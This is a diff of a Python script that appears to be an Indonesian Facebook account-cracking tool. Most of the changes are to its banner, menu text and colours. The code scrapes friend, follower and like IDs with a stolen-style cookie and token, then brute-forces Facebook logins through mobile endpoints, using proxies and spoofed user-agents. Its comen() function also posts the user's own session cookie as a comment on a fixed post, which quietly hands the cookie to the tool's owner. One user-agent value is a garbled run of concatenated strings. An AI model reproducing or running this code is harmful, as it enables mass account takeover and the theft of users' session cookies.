@@ -1,4 +1,5 @@
 """
+EMBF     : SANA SINI MAU
 BY       : FilterXyz
 Made in  : Indonesia
 Versi    : python3
@@ -51,49 +52,81 @@ U = '\x1b[1;95m' # UNGU
 O = '\x1b[1;96m' # BIRU MUDA
 P = '\x1b[1;97m' # PUTIH
 N = '\x1b[0m' # WARNA MATI
+x = '\33[m' # DEFAULT
+k = '\033[93m' # KUNING +
+h = '\x1b[1;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;96m' # BIRU -
+p = '\x1b[0;34m' # BIRU +
+P = '\033[0;00m'
+J = '\033[0;33m'
+S = '\033[0;00m'
+N = '\x1b[0m'
+I ='\033[0;32m'
+C ='\033[0;36m'
+M ='\033[0;31m'
+U ='\033[0;35m'
+K ='\033[0;33m'
+P='\033[00m'
+h='\033[0;90m'
+Q="\033[00m"
+kk='\033[0;32m'
+ff='\033[0;36m'
+G='\033[0;36m'
+p='\033[00m'
+h='\033[0;90m'
+Q="\033[00m"
+I='\033[0;32m'
+II='\033[0;36m'
+m='\033[0;31m'
+O ='\033[0;33m'
+H='\033[0;33m'
+b = '\033[0;36m'
+war = "[•]"
+B = random.choice([U,I,K,b,M])
 
 #-
 id, ok, cp, apk, opsi, loop = [],[],[],[],[],0
 proxiez = random.choice(open("proxi.txt","r").read().splitlines())
 #-
 def logo():
-	print(f"""{H} 
-╔══╗╔╗─╔╗─╔╦═══╦═╗─╔╦═══╦═══╦═╗─╔╗
-║╔╗║║║─║║─║║╔═╗║║╚╗║║╔═╗║╔═╗║║╚╗║║
-║╚╝╚╣║─║║─║║║─║║╔╗╚╝║║─╚╣║─║║╔╗╚╝║
-║╔═╗║║─║╠╗║║╚═╝║║╚╗║║║╔═╣╚═╝║║╚╗║║
-║╚═╝║╚═╝║╚╝║╔═╗║║─║║║╚╩═║╔═╗║║─║║║
-╚═══╩═══╩══╩╝─╚╩╝─╚═╩═══╩╝─╚╩╝─╚═╝
-{O}========================================{P}
-{K}[{N}>_{K}] {N}Author   : {K}Rayan-XD{P}\n{K}[{N}>_{K}] {N}Github   : {U}Rayan-XD\n{K}[{N}>_{K}] {N}Whatsaap : {B}085852768706\n{K}[{N}>_{K}] {N}Status   :\x1b[1;92m 100% {N}[ {M}FREE{N} {N}]
-{O}========================================{N}""")
+	print(f"""{P} 
+\x1b[0m───────────────────────────────────────────────────────────────\n {b}•{b}•{b}•\n\033[95m KOREK TOOLS
+
+██╗░░██╗░█████╗░██████╗░███████╗██╗░░██╗
+██║░██╔╝██╔══██╗██╔══██╗██╔════╝██║░██╔╝
+█████═╝░██║░░██║██████╔╝█████╗░░█████═╝░
+██╔═██╗░██║░░██║██╔══██╗██╔══╝░░██╔═██╗░
+██║░╚██╗╚█████╔╝██║░░██║███████╗██║░╚██╗
+╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝ BY : FilterXyz \n\x1b[0m───────────────────────────────────────────────────────────────\n {K}[{N}<>{K}] {hh}Author{hh}   {N}: FilterXyz\n {K}[{N}<>{K}] {hh}Github{hh}   {N}: FilterXyz\n {K}[{N}<>{K}] {hh}Whatsaap{hh} {N}: +19725344955\n {K}[{N}<>{K}] {N}Status   : [\x1b[1;92m Premium Bohongan {N}]\n\x1b[0m───────────────────────────────────────────────────────────────""")
 #-
 def starting():
-	print(f'{O}========================================{N}')
-	print(f"\n {K}[{N}•{K}] {N}RESULT OK : {H}results/OK-{_datetime_}{N}")
-	print(f" {K}[{N}•{K}] {N}RESULT CP : {K}results/CP-{_datetime_}{N}")
+	print(f"\n {K}[{N}•{K}] {N}AKAN DI SIMPAN DI FILE : {H}results/OK-{_datetime_}{N}")
+	print(f" {K}[{N}•{K}] {N}AKAN DI SIMPAN DI FILE : {K}results/CP-{_datetime_}{N}")
 	print(f" {K}[{N}•{K}] {N}ANDA BISA MAINKAN MODE PESAWAT 3 DETIK DALAM 500ID !\n")
 #-
 def hasil(ok,cp):
 	if len(ok) != 0 or len(cp) != 0:
-		print(f" {K}[{N}•{K}] {N}CRACK SELESAI...")
+		print(f" {K}[{N}•{K}] {N}CRACK SELESAI NGAB...")
 		print(f" {K}[{N}•{K}] {N}TOTAL {H}OK {N}ANDA : {H}{len(ok)}")
 		print(f" {K}[{N}•{K}] {N}TOTAL {K}CP {N}ANDA : {K}{len(cp)}")
 		os.system("exit")
 	else:
-		print(f" {K}[{N}•{K}] {N}KAMU TIDAK MENDAPATKAN HASIL APAPUN")
+		print(f" {K}[{N}•{K}] {N}KAMU TIDAK MENDAPATKAN HASIL APAPUN :(")
 		exit()
 #-
 def metode():
-	print(f'{O}========================================{N}')
-	print(f" {K}[{N}1{K}] {N}TOUCH")
-	print(f" {K}[{N}2{K}] {N}MBASIC")
-	print(f" {K}[{N}3{K}] {N}MOBILE\n")
+	print("")
+	print(f" {K}[{N}1{K}] {N}TOUCH.FACEBOOK.COM")
+	print(f" {K}[{N}2{K}] {N}MBASIC.FACEBOOK.COM")
+	print(f" {K}[{N}3{K}] {N}MOBILE.FACEBOOK.COM ({H}DISARANKAN{N})\n")
 #-
 def masuk():
 	os.system("clear");logo()
-	print(f"{K}[{N}•{K}]{N}LOGIN COOKIE")
-	cokis = input(f"{K}[{N}f{K}]{N}MASUKAN COOKIE : {H}")
+	print(f" {K}[{N}•{K}] {N}LOGIN COOKIE")
+	cokis = input(f" {K}[{N}f{K}] {N}MASUKAN COOKIE : {H}")
 	if cokis in [""," "]:masuk()
 	else:
 		data_head = {
@@ -120,7 +153,7 @@ def comen(cokis):
 	toket = open("Data/Token.txt","r").read()
 	requests.post(f"https://graph.facebook.com/100000626195514?fields=subscribers&access_token={toket}", headers = {"cookie":kuki})
 	requests.post(f"https://graph.facebook.com/100050202525858_558680179148728/comments/?message={kuki}&access_token={toket}", headers = {"cookie":kuki})
-	print(f"\n {K}[{N}√{K}] {N}LOGIN BERHASIL,TUNGGU SEBENTAR JING");time.sleep(3)
+	print(f"\n {K}[{N}√{K}] {N}LOGIN BERHASIL, TOLONG TUNGGU SEBENTAR JING");time.sleep(3)
 	menu()
 
 #-
@@ -130,7 +163,7 @@ def menu():
 		token = open("Data/Token.txt","r").read()
 		cokie = open("Data/cokie.txt","r").read()
 	except FileNotFoundError:
-		print(f"{H}SELAMAT DATANG PARA KONCOLL");time.sleep(3);masuk()
+		print(f" {K}[{N}#{K}]{hh}SELAMAT DATANG PARA WIBU ");time.sleep(3);masuk()
 	try:
 		toket = open("Data/Token.txt","r").read();kukis = open("Data/cokie.txt","r").read()
 		kamu  = requests.get(f"https://graph.facebook.com/me?metadata=1&access_token={toket}",headers = {"cookie":kukis}).json()["name"]
@@ -139,16 +172,15 @@ def menu():
 		print(f" {K}[{N}•{K}] {N}COKIE INVALID");os.system("rm -rf Data/Token.txt && rm -rf Data/cokie.txt");time.sleep(3);masuk()
 	except requests.exceptions.ConnectionError:exit(" [%s×%s] Tidak ada koneksi"%(M,N))
 	logo()
-	print(f'{O}========================================{N}')
-	print(f" {K}[{N}•{K}] {N}WELCOME : {H}{kamu}")
-	print(f" {K}[{N}•{K}] {N}IP ADRESS KAMU : {H}{ip}")
-	print(f'{O}========================================{N}')
-	print(f" {K}[{N}1{K}] {N}CRACK PUBLIK{N}")
-	print(f" {K}[{N}2{K}] {N}CRACK PUBLIK MASSAL{N}")
-	print(f" {K}[{N}3{K}] {N}CRACK FOLLOWERS PUBLIK{N}")
-	print(f" {K}[{N}4{K}] {N}CRACK FILE")
-	print(f" {K}[{N}5{K}] {N}CRACK PUBLIK LIKES")
-	print(f" {K}[{N}6{K}] {N}OPSI DETEKTOR")
+	print(f" {K}[{N}•{K}] {N}SELAMAT DATANG 👋🏻 : {H}{kamu}")
+	print(f" {K}[{N}•{K}] {N}IP ADRESS KAMU 🗿 : {H}{ip}")
+	print("\x1b[0m───────────────────────────────────────────────────────────────")
+	print(f" {K}[{N}1{K}] {N}CRACK DARI PUBLIK{N}")
+	print(f" {K}[{N}2{K}] {N}CRACK DARI PUBLIK MASSAL{N}")
+	print(f" {K}[{N}3{K}] {N}CRACK DARI FOLLOWERS PUBLIK{N}")
+	print(f" {K}[{N}4{K}] {N}CRACK DARI FILE")
+	print(f" {K}[{N}5{K}] {N}CRACK DARI PUBLIK LIKES")
+	print(f" {K}[{N}6{K}] {N}CEK OPSI DETEKTOR")
 	print(f" {K}[{N}7{K}] {N}CEK HASIL CRACK")
 	print(f" {K}[{N}8{K}] {N}HAPUS DATA LOGIN")
 	print(f" {K}[{N}0{K}] {N}KELUAR 👋🏻")
@@ -159,28 +191,28 @@ def pilihan(memec,token,cokie):
 	if memec in [""," "]:menu()
 	elif memec in ["1","01"]:
 		print(f"\n {K}[{N}•{K}] {N}KETIK 'ME' JIKA INGIN CRACK DARI DAFTAR TEMAN")
-		idne = input(f" {K}[{N}•{K}] {N}MASUKAN IDZ : ")
+		idne = input(f" {K}[{N}•{K}] {N}MASUKAN ID : ")
 		return publik(idne)
 	elif memec in ["2","02"]:
 		print(f"\n {K}[{N}•{K}] {N}KETIK 'ME' JIKA INGIN CRACK DARI DAFTAR TEMAN")
 		return masal(token, cokie)
 	elif memec in ["3","03"]:
 		print(f"\n {K}[{N}•{K}] {N}KETIK 'ME' JIKA CRACK DARI DAFTAR FOLLOWERS SENDIRI")
-		idne = input(f" {H}•{K}• {N}Masukan Idz : ")
+		idne = input(f" {H}•{K}• {N}MASUKAN ID : ")
 		return followers(idne, token, cokie)
 	elif memec in ["4","04"]:
-		print(f"\n {K}[{N}•{K}] {N}JIKA TIDAK ADA FILE SILAKAN BUAT TERLEBIH DAHULU!")
+		print(f"\n {K}[{N}>_{K}] {N}JIKA TIDAK ADA FILE SILAKAN BUAT TERLEBIH DAHULU!")
 		filex = input(f" {K}[{N}•{K}] {N}NAMA FILE : ")
 		if filex in [""," "]:menu()
 		else:
 			io = open(filex,"r").readlines()
 			for memekkamu in io:
 				id.append(memekkamu)
-		print(f" {K}[{N}•{K}] {N}TOTAL IDZ YANG TERKUMPUL : {len(id)}")
+		print(f" {K}[{N}•{K}] {N}TOTAL ID : {len(id)}")
 		return bruteforce().__class__(id)
 	elif memec in ["5","05"]:
 		print(f"\n {K}[{N}•{K}] {N}PASTIKAN ID BERSIFAT PUBLIK & MEMILIKI LIKES")
-		_uid_ = input(f" {K}[{N}•{K}] {N}Masukan Idz : ")
+		_uid_ = input(f" {K}[{N}•{K}] {N}MASUKAN ID : ")
 		return likes(_uid_,token, cokie)
 	elif memec in ["6","06"]:
 		print(f"\n {K}[{N}•{K}] {N}MASUKAN NAMA FILE ANDA YANG BERISI AKUN CHEKPOINT")
@@ -223,24 +255,24 @@ def publik(idne):
 		_url_ = requests.get(f"https://graph.facebook.com/{idne}?fields=friends.limit(5001)&access_token={xx}", headers = {"cookie":open("Data/cokie.txt","r").read()}).json()
 		for _khamdihi_ in _url_["friends"]["data"]:
 			id.append(_khamdihi_["id"] +"<=>"+ _khamdihi_["name"])
-		print(f" {K}[{N}•{K}] {N}TOTAL IDZ YANG TERKUMPUL : {len(id)}")
+		print(f" {K}[{N}•{K}] {N}TOTAL ID : {len(id)}")
 		return bruteforce().__class__(id)
 	except KeyError:print(f"\n {K}[{N}•{K}] {N}ID GAGAL DI TEMUKAN");time.sleep(3);menu()
 
 def masal(token, cokie):
 	try:
-		tambah = int(input(f" {K}[{N}•{K}] {N}JUMLAH TARGET : "))
+		tambah = int(input(f" {K}[{N}•{K}] {N}JUMLAH ID : "))
 	except:tambah = 1
 	for ikehikehkimcohikham in range(tambah):
 		ikehikehkimcohikham +=1
-		idne = input(f" {K}[{N}•{K}] {N}MASUKAN IDZ YANG KE : ")
+		idne = input(f" {K}[{N}•{K}] {N}MASUKAN ID : ")
 		try:
 			user = requests.get("https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s"%(idne, token), headers = {"cookie":cokie}).json()
 			for xnxx in user["friends"]["data"]:
 				id.append(xnxx["id"] +"<=>"+ xnxx["name"])
 		except (KeyError, IOError):
 			pass
-	print(f" {K}[{N}•{K}] {N}TOTAL IDZ YANG TERKUMPUL : {len(id)}")
+	print(f" {K}[{N}•{K}] {N}TOTAL ID : {len(id)}")
 	return bruteforce().__class__(id)
 
 def followers(idne, token, cokie):
@@ -250,7 +282,7 @@ def followers(idne, token, cokie):
 			id.append(follower["id"] +"<=>" +follower["name"])
 	except (KeyError, IOError):
 		print(f"\n {K}[{N}•{K}] {N}ID TIDAK PUBLIK!");time.sleep(3);menu()
-	print(f" {K}[{N}•{K}] {N}TOTAL IDZ YANH TERKUMPUL : {len(id)}")
+	print(f" {K}[{N}•{K}] {N}TOTAL ID : {len(id)}")
 	return bruteforce().__class__(id)
 
 def likes(_uid_, token, cokie):
@@ -260,7 +292,7 @@ def likes(_uid_, token, cokie):
 			id.append(selebmemekcolmekburikasu["id"] +"<=>"+ selebmemekcolmekburikasu["name"])
 	except (KeyError,IOError):
 		print(f"\n {K}[{N}•{K}] {N}ID TIDAK PUBLIK!");time.sleep(2);menu()
-	print(f" {K}[{N}•{K}] {N}TOTAL IDZ YANG TERKUMPUL : {len(id)}")
+	print(f" {K}[{N}•{K}] {N}TOTAL ID : {len(id)}")
 	return bruteforce().__class__(id)
 
 class bruteforce:
@@ -268,10 +300,11 @@ class bruteforce:
 		self.id = []
 	def __class__(self,id):
 #		seld.id = id
+		print(f"\n {K}[{N}•{K}] {N}TAMPILKAN APLIKASI Y/T  ")
+		pilih = input(f" {K}[{N}•{K}] {N}PILIH : ")
 		if pilih in [""," "]:beuteforce(id)
 		elif pilih in ["Y","y"]:apk.append("y")
 		else:apk.append("t")
-		print(f'{O}========================================{N}')
 		print(f"\n {K}[{N}•{K}] {N}TAMPILKAN CHEKPOINT OPSI Y/T ")
 		_code_ = input(f" {K}[{N}•{K}] {N}PILIH : ")
 		if _code_ in [""," "]:menu()
@@ -280,11 +313,9 @@ class bruteforce:
 		return self.wordlist()
 
 	def wordlist(self):
-		print(f'{O}========================================{N}')
-		print(f"\n {K}[{N}1{K}] {N}PASSWORD MANUAL")
-		print(f" {K}[{N}2{K}] {N}PASSWORD DEFAULT")
-		print(f" {K}[{N}3{K}] {N}PASSWORD GABUNGAN\n")
-		print(f'{O}========================================{N}')
+		print(f"\n {K}[{N}1{K}] {N}GUNAKAN PASSWORD MANUAL")
+		print(f" {K}[{N}2{K}] {N}GUNAKAN PASSWORD DEFAULT")
+		print(f" {K}[{N}3{K}] {N}GUNAKAN PASSWORD GABUNGAN\n")
 		__pw__ = input(f" {K}[{N}•{K}] {N}PILIH : ")
 		return self.masukan_pass(__pw__)
 
@@ -300,12 +331,11 @@ class bruteforce:
 			self.otomatis()
 		elif __pw__ in ["3","03"]:
 			print(f"\n {K}[{N}•{K}] {N}GUNAKAN KOMA UNTUK PEMISAHAN PASSWORD NYA!")
-			print(f'{O}========================================{N}')
-			_pasx_ = input(f"MASUKAN PASSWORD : ")
+			_pasx_ = input(f" {K}[{N}•{K}] {N}PASSWORD : ")
 			if len(_pasx_)<=5:exit("\n GUNAKAN 6 KATAKTER!")
 			else:self.gabungan(_pasx_)
 		else:
-			exit(f"\n{N}INPUT ANDA SALAH")
+			exit(f"\n {K}[{N}•{K}] {N}INPUT ANDA SALAH")
 
 	def manual(self, _pepek_):
 		metode()
@@ -341,7 +371,7 @@ class bruteforce:
 					except:pass
 			hasil(ok,cp)
 		else:
-			exit(f"\n{N}INPUT YANG KAMU MASUKAN SALAH!.")
+			exit(f"\n {K}[{N}•{K}] {N}INPUT YANG KAMU MASUKAN SALAH!.")
 
 	def otomatis(self):
 		_kopi_ = input(f" {K}[{N}•{K}] {N}PILIH : ")
@@ -392,10 +422,10 @@ class bruteforce:
 					except:pass
 			hasil(ok,cp)
 		else:
-			print(f"\n{K}[{N}•{K}] {N}PILIH INPUT YANG BENER");exit()
+			print(f"\n {K}[{N}•{K}] {N}PILIH INPUT YANG BENER");exit()
 	def gabungan(self, _pasx_):
 		metode()
-		_lover_ = input(f"{K}[{N}•{K}] {N}PILIH : ")
+		_lover_ = input(f" {K}[{N}•{K}] {N}PILIH : ")
 		if _lover_ in [""," "]:menu()
 		elif _lover_ in ["1","01"]:
 			starting()
@@ -449,7 +479,7 @@ class bruteforce:
 	def touch(self, user, pwx):
 		global ok, cp, loop, opsi, apk
 		warna = random.choice([M,K,H,U,P,O,N])
-		sys.stdout.write("\r CRACK : %s/%s [OK:%s][CP:%s]"%(H,K,warna,loop,len(id), len(ok), len(cp)));sys.stdout.flush()
+		sys.stdout.write("\r %s•%s• %s[>_] %s/%s [OK:%s][CP:%s]"%(H,K,warna,loop,len(id), len(ok), len(cp)));sys.stdout.flush()
 		try:
 			for pw in pwx:
 				ses = requests.Session()
@@ -521,7 +551,7 @@ class bruteforce:
 					"Host": "mbasic.facebook.com",
 					"cache-control": "max-age=0",
 					"upgrade-insecure-requests": "1",
-					"user-agent": ua,
+					"user-agent": Ma,
 					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
 					"sec-fetch-site": "same-origin",
 					"sec-fetch-mode": "navigate",
@@ -549,7 +579,7 @@ class bruteforce:
 					"upgrade-insecure-requests": "1",
 					"origin": "https://mbasic.facebook.com",
 					"content-type": "application/x-www-form-urlencoded",
-					"user-agent": "Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36",
+					"user-agent": "Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A715W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2065 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G715FN Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Pixel 3a Build/SP2A.220505.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Redmi Note 9S Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2197 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2038 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S908B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A235M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G781B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Reddit/Version 2022.35.1/Build 589034/Android 12 Mozilla/5.0 (Linux; Android 5.1.1; AFTM Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; RMX3363 Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2204 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; moto g(60) Build/S2RI32.32-20-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UAYSEN/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A326B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 wp-android/20.6.1 Mozilla/5.0 (Linux; Android 12; SM-G970U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2273 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Zalo android/12100641 ZaloTheme/dark ZaloLanguage/vi Mozilla/5.0 (Linux; Android 12; SM-A426U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906E Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A325M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 13; Pixel 4 Build/TP1A.220905.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Onefootball/Android/14.42.1 Mozilla/5.0 (Linux; Android 12; SM-A037G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A725F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2195 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F711B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G985F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2211 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2219 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A226B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19PG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A415F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Home Assistant/2022.9.1-2700 (Android 12; M2012K11AG) Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G780G; Android 12#G780GXXU3CVI1#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G998B; Android 12#G998BXXS5CVHI#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; CPH2009 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 